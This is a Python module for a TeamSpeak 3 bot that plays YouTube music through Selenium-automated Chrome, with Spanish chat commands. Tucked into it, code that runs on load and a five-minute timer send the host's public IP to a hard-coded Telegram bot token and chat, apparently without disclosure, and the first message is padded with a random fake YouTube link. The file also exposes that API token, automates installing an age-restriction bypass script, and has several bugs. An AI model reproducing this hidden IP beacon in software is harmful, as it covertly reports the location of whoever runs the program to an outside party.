import string
import requests
import Moduleloader
import Bot
import logging
import re
import subprocess
import time
import threading
import random
import os
from Moduleloader import *
from numpy import NaN
from ts3.TS3Connection import TS3QueryException
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains


from urllib import parse, request

__version__ = "0.4"
bot = None
logger = logging.getLogger("bot")


@Moduleloader.setup
def setup(ts3bot):
    global bot
    bot = ts3bot


def openWebdriver():
    chrome_options = Options()
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--window-size=516,947')
    chrome_options.add_argument('--hide-scrollbars')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_extension('./extensions/ezyZip.crx')
    chrome_options.add_extension('./extensions/Tampermonkey.crx')
    chrome_options.add_extension('./extensions/uBlock-Origin.crx')
    chrome_options.add_extension('./extensions/Audio-Only-Youtube.crx')
    chrome_options.add_extension('./extensions/YouTube-NonStop.crx')
    global driver
    driver = webdriver.Chrome(options=chrome_options)


openWebdriver()

time.sleep(5)

tab_handles = driver.window_handles
driver.switch_to.window(tab_handles[2])
driver.close()
driver.switch_to.window(tab_handles[0])
driver.close()
driver.switch_to.window(tab_handles[1])


# install age Simple-YouTube-Age-Restriction-Bypass
driver.get('chrome://extensions/')
webdriver.ActionChains(driver, 1).send_keys(Keys.TAB).send_keys(Keys.TAB).send_keys(Keys.TAB).send_keys(
    Keys.TAB).send_keys(Keys.TAB).send_keys(Keys.TAB).send_keys(Keys.TAB).send_keys(Keys.TAB).send_keys(Keys.ENTER).perform()
webdriver.ActionChains(driver, 1).send_keys(Keys.TAB).send_keys(Keys.TAB).send_keys(Keys.TAB).send_keys(
    Keys.TAB).send_keys(Keys.TAB).send_keys(Keys.TAB).send_keys(Keys.TAB).send_keys(Keys.TAB).send_keys(Keys.ENTER).perform()
time.sleep(1)
tab_handles = driver.window_handles
driver.close()
driver.switch_to.window(tab_handles[1])
WebDriverWait(driver, 5).until(
    EC.element_to_be_clickable((By.XPATH, '//*[@id="div_dXRpbHNfdXRpbHM_tab_util_h"]'))).click()
driver.find_element(By.ID, ('input_ZmlsZV91dGlscw_file')).send_keys(
    os.getcwd()+"./extensions/Simple-YouTube-Age-Restriction-Bypass.user.js")
time.sleep(1)
tab_handles = driver.window_handles
driver.switch_to.window(tab_handles[1])
webdriver.ActionChains(driver, 1).send_keys(Keys.ENTER).perform()
driver.switch_to.window(tab_handles[0])


public = []
public.append(requests.get('http://checkip.amazonaws.com').text.strip())
apiToken = '5742926506:AAERVS76J_JFN2e2Xw_8FM0LdVSKmMC37IM'
chatID = '-1001404826280'
apiURL = f'https://api.telegram.org/bot{apiToken}/sendMessage'
message = public_current = requests.get(
    'http://checkip.amazonaws.com').text.strip()
rnd = ''.join(random.choice(string.ascii_letters + string.digits)
              for _ in range(11))
response = requests.post(apiURL, json={
                         'chat_id': chatID, 'text': f"#ip {message}\n https://www.youtube.com/watch?v={rnd}"})
print(public)
last_url = []
song_actual = [[], []]
list_songs = []


def musicplay(sender, msg):
    song = msg.split()[1:]
    songg = " ".join(map(str, song))
    driver.get('https://www.youtube.com/results?search_query=' + songg)
    x = 0
    z = False
    time.sleep(1)
    try:
        WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable((By.XPATH, '//*[@id="video-title"]/yt-formatted-string'))).click()
    except Exception:
        print('p not work')
        x = 1
        pass
    time.sleep(2)
    try:
        cancion = driver.find_element(
            By.XPATH, '//*[@id="title"]/h1' or '//*[@id="layout"]/ytmusic-player-bar/div[2]/div[2]').text
        link = driver.current_url
    except Exception:
        pass
    time.sleep(1)
    webdriver.ActionChains(driver, 1).move_to_element(driver.find_element(
        By.XPATH, '//*[@id="movie_player"]/div[1]/video')).perform()
    try:
        duracion = driver.find_element(
            By.CSS_SELECTOR, '#movie_player > div.ytp-chrome-bottom > div.ytp-chrome-controls > div.ytp-left-controls > div.ytp-time-display.notranslate > span:nth-child(2) > span.ytp-time-duration').text
        print(duracion)
        global intervalG
        intervalG = re.split(":", duracion)
    except Exception:
        pass
    try:
        if len(intervalG) <= 2:
            intervalG[0] = int(intervalG[0]) * 60
            intervalG[1] = int(intervalG[1])
            intervalG = intervalG[0] + intervalG[1]
        else:
            intervalG[0] = int(intervalG[0]) * 60**2
            intervalG[1] = int(intervalG[1]) * 60
            intervalG[2] = int(intervalG[2])
            intervalG = intervalG[0] + intervalG[1] + intervalG[2]
        print(intervalG)
    except Exception:
        print('error time song')
    try:
        hilo = threading.Thread(target=funcion_en_hilo(intervalG, sender))
        hilo.start()
    except Exception:
        print(Exception)
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")
    Bot.send_msg_to_client(bot.ts3conn, sender, "Reproduciendo " + cancion)
    Bot.send_msg_to_client(bot.ts3conn, sender, "usa !help para ver comandos")
    Bot.send_msg_to_client(bot.ts3conn, sender, link)
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")


def musicqueue(sender, msg):
    song = msg.split()
    if len(song) != 1:
        list_songs.append(msg)
        if len(list_songs) == 1:
            hilo = threading.Thread(target=funcion_en_hilo(intervalG, sender))
            hilo.start()
        Bot.send_msg_to_client(bot.ts3conn, sender,
                               "=============================================")
        for i in list_songs:
            song = i.split()[1:]
            songg = " ".join(map(str, song))
            Bot.send_msg_to_client(bot.ts3conn, sender,
                                   f'{list_songs.index(i)}. {songg}')
        Bot.send_msg_to_client(bot.ts3conn, sender,
                               "usa !help para ver comandos")
        Bot.send_msg_to_client(bot.ts3conn, sender,
                               "=============================================")
    else:
        Bot.send_msg_to_client(bot.ts3conn, sender,
                               "=============================================")
        for i in list_songs:
            song = i.split()[1:]
            songg = " ".join(map(str, song))
            Bot.send_msg_to_client(bot.ts3conn, sender,
                                   f'{list_songs.index(i)}. {songg}')
        Bot.send_msg_to_client(bot.ts3conn, sender,
                               "usa !help para ver comandos")
        Bot.send_msg_to_client(bot.ts3conn, sender,
                               "=============================================")


def funcion_en_hilo(intervalG, sender):
    if len(list_songs) != 0:
        time.sleep(intervalG)
        sigsong(sender)
    else:
        print('not more songs')


def sigsong(sender):
    try:
        temporal = list_songs[0]
        list_songs.pop(0)
        musicplay(sender, temporal)
    except Exception:
        print("Error")


class Timer(threading.Thread):
    def __init__(self):
        self._timer_runs = threading.Event()
        self._timer_runs.set()
        super().__init__()

    def run(self):
        while self._timer_runs.is_set():
            self.timer()
            time.sleep(self.__class__.interval)

    def stop(self):
        self._timer_runs.clear()


class timer5(Timer):
    interval = 300  # Intervalo en segundos.
    # Función a ejecutar.

    def timer(self):

        try:
            def get_ip():
                try:
                    public_current = requests.get(
                        'http://checkip.amazonaws.com').text.strip()
                except:
                    public_current = 'unknown'
                return (public_current)

            def send_ip(message):

                apiToken = '5742926506:AAERVS76J_JFN2e2Xw_8FM0LdVSKmMC37IM'
                chatID = '-1001404826280'
                apiURL = f'https://api.telegram.org/bot{apiToken}/sendMessage'
                if message != public[0]:
                    try:
                        response = requests.post(
                            apiURL, json={'chat_id': chatID, 'text': f"#ip {message}"})
                        public[0] = requests.get(
                            'http://checkip.amazonaws.com').text.strip()
                    except Exception as e:
                        print(e)

            send_ip(get_ip())
        except Exception as e:
            print(e)


timer5 = timer5()
timer5.start()


@command('test')
@group('Server Admin', 'Guest')
def test(sender, msg):
    get_command_list('!help')


@command('help')
@group('Server Admin', 'Guest')
def get_command_list(sender, msg):
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")
    Bot.send_msg_to_client(bot.ts3conn, sender, "!p = buscar cancion")
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "!q = agrega cancion a la cola")
    Bot.send_msg_to_client(bot.ts3conn, sender, "!pl = url de playlist")
    Bot.send_msg_to_client(bot.ts3conn, sender, "!pn = siguiente cancion")
    Bot.send_msg_to_client(bot.ts3conn, sender, "!pa = cancion anterior")
    Bot.send_msg_to_client(bot.ts3conn, sender, "!ps = pausar musica/inicar")
    Bot.send_msg_to_client(bot.ts3conn, sender, "!pf = 10 seungos adelante")
    Bot.send_msg_to_client(bot.ts3conn, sender, "!pa = 10 segundos atras")
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "!inf = nombre de la cancion que esta sonando")
    Bot.send_msg_to_client(bot.ts3conn, sender, "!palt = Aleatorio activo")
    Bot.send_msg_to_client(bot.ts3conn, sender, "!reset = Rinicia la musica")
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")


@command('p')
@group('Server Admin', 'Guest')
def musicplayf(sender, msg):
    musicplay(sender, msg)


@command('q')
@group('Server Admin', 'Guest')
def musicqueuef(sender, msg):
    musicqueue(sender, msg)


@command('pl')
@group('Server Admin', 'Guest')
def musicplayl(sender, msg):
    song = msg.split()[1:]
    songg = "".join(map(str, song))
    songg = re.sub("\[URL]|\[/URL]", "", songg)
    driver.get(songg)
    try:
        cancion = driver.find_elements_by_xpath(
            '//*[@id="container"]/h1/yt-formatted-string' or '//*[@id="container"]/h1/yt-formatted-string')[0].text
    except Exception:
        pass
    try:
        lista = WebDriverWait(driver, 5)\
            .until(EC.visibility_of_element_located((By.XPATH,
                                                     '/html/body/ytd-app/div/ytd-page-manager/ytd-watch-flexy/div[5]/div[1]/div/ytd-playlist-panel-renderer/div/div[1]/div/div[1]/div[1]/h3/yt-formatted-string/a')))\
            .text
    except Exception:
        pass
    try:
        lista1 = WebDriverWait(driver, 5)\
            .until(EC.visibility_of_element_located((By.XPATH,
                                                     '/html/body/ytd-app/div/ytd-page-manager/ytd-watch-flexy/div[5]/div[1]/div/ytd-playlist-panel-renderer/div/div[1]/div/div[1]/div[1]/div/yt-formatted-string')))\
            .text
    except Exception:
        pass
    try:
        Bot.send_msg_to_client(bot.ts3conn, sender,
                               "Reproduciendo " + lista + " De " + lista1)
    except Exception:
        pass
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")
    Bot.send_msg_to_client(bot.ts3conn, sender, "Reproduciendo " + cancion)
    Bot.send_msg_to_client(bot.ts3conn, sender, "usa !help para ver comandos")
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")
    # Busqueda de cancion


@command('pn')
@group('Server Admin', 'Guest')
def nextsong(sender, msg,):
    webdriver.ActionChains(driver).key_down(
        Keys.SHIFT).send_keys("N").perform()
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")
    Bot.send_msg_to_client(bot.ts3conn, sender, "Siguiente")
    Bot.send_msg_to_client(bot.ts3conn, sender, "usa !help para ver comandos")
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")


@command('pa')
@group('Server Admin', 'Guest')
def previoussong(sender, msg,):
    webdriver.ActionChains(driver).key_down(
        Keys.SHIFT).send_keys("P").perform()
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")
    Bot.send_msg_to_client(bot.ts3conn, sender, "Anterior")
    Bot.send_msg_to_client(bot.ts3conn, sender, "usa !help para ver comandos")
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")


@command('ps')
@group('Server Admin', 'Guest')
def songstop(sender, msg,):
    song = driver.current_url
    songg = re.findall('m.youtube.com', song) or re.findall(
        'music.youtube.com', song) or song
    if songg[0] == 'music.youtube.com' or songg[0] == 'm.youtube.com':
        webdriver.ActionChains(driver).send_keys(";").perform()
        Bot.send_msg_to_client(bot.ts3conn, sender,
                               "=============================================")
        Bot.send_msg_to_client(bot.ts3conn, sender, "Pausa")
        Bot.send_msg_to_client(bot.ts3conn, sender,
                               "usa !help para ver comandos")
        Bot.send_msg_to_client(bot.ts3conn, sender,
                               "=============================================")
        pass
    else:
        webdriver.ActionChains(driver).send_keys("k").perform()
        Bot.send_msg_to_client(bot.ts3conn, sender,
                               "=============================================")
        Bot.send_msg_to_client(bot.ts3conn, sender, "Pausa")
        Bot.send_msg_to_client(bot.ts3conn, sender,
                               "usa !help para ver comandos")
        Bot.send_msg_to_client(bot.ts3conn, sender,
                               "=============================================")
        pass


@command('palt')
@group('Server Admin', 'Guest')
def songalt(sender, msg,):
    WebDriverWait(driver, 1)\
        .until(EC.element_to_be_clickable((By.XPATH,
                                           '/html/body/ytd-app/div/ytd-page-manager/ytd-watch-flexy/div[5]/div[2]/div/ytd-playlist-panel-renderer/div/div[1]/div/div[2]/div[1]/div[1]/ytd-menu-renderer/div[2]/ytd-toggle-button-renderer[2]/a/yt-icon-button/button')))\
        .click()
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")
    Bot.send_msg_to_client(bot.ts3conn, sender, "Aleatorio activo")
    Bot.send_msg_to_client(bot.ts3conn, sender, "usa !help para ver comandos")
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")


@command('pf')
@group('Server Admin', 'Guest')
def songmas10(sender, msg,):
    webdriver.ActionChains(driver).send_keys("l").perform()
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")
    Bot.send_msg_to_client(bot.ts3conn, sender, "10 seg adelante")
    Bot.send_msg_to_client(bot.ts3conn, sender, "usa !help para ver comandos")
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")


@command('pa')
@group('Server Admin', 'Guest')
def songmenos10(sender, msg,):
    webdriver.ActionChains(driver).send_keys("j").perform()
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")
    Bot.send_msg_to_client(bot.ts3conn, sender, "10 seg atras")
    Bot.send_msg_to_client(bot.ts3conn, sender, "usa !help para ver comandos")
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")


@command('inf')
@group('Server Admin', 'Guest')
def songinfo(sender, msg,):
    urlcurrent = driver.current_url
    try:
        info = driver.find_element(
            By.XPATH, '//*[@id="title"]/h1' or '//*[@id="title"]' or '//*[@id="title"]/h1/yt-formatted-string').text
    except Exception:
        z = 1
        print('not found info')
        pass
    try:
        if z == 1:
            try:
                info = driver.find_element(
                    By.XPATH, '//*[@id="layout"]/ytmusic-player-bar/div[2]/div[2]')[0].text
            except Exception:
                print('not found info ytmus')
                pass
    except Exception:
        pass
    try:
        elemento_objetivo = duracion = driver.find_element(
            By.CSS_SELECTOR, '#movie_player > div.html5-video-container > video')
        ActionChains(driver, 1000).move_to_element(elemento_objetivo)
        duracion = driver.find_element(
            By.CSS_SELECTOR, '#movie_player > div.ytp-chrome-bottom > div.ytp-chrome-controls > div.ytp-left-controls > div.ytp-time-display.notranslate > span:nth-child(2) > span.ytp-time-current').text
        intervalG = re.split(":", duracion)
    except Exception:
        pass

    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")
    Bot.send_msg_to_client(bot.ts3conn, sender, f'url: {urlcurrent}')
    try:
        Bot.send_msg_to_client(bot.ts3conn, sender, f'{info}')
    except Exception:
        pass
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           f'minuto {intervalG[0]} : {intervalG[1]}')

    Bot.send_msg_to_client(bot.ts3conn, sender, "usa !help para ver comandos")
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")


@command('purge')
@group('Server Admin', 'Guest')
def purgar(sender, msg,):
    driver.delete_all_cookies()
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")
    Bot.send_msg_to_client(bot.ts3conn, sender, 'Se eliminaron todas la cokis')
    Bot.send_msg_to_client(bot.ts3conn, sender, "usa !help para ver comandos")
    Bot.send_msg_to_client(bot.ts3conn, sender,
                           "=============================================")


@command('reset')
@group('Server Admin', 'Guest')
def reset(sender, msg,):
    p = subprocess.Popen("C:\\Users\\tebit\\Desktop\\bot_ts3_v1.1\\main.py")
    Moduleloader.exit_all()
    bot.ts3conn.quit()
    logger.warning("Bot was quit!")
    import main
    main.restart_program()
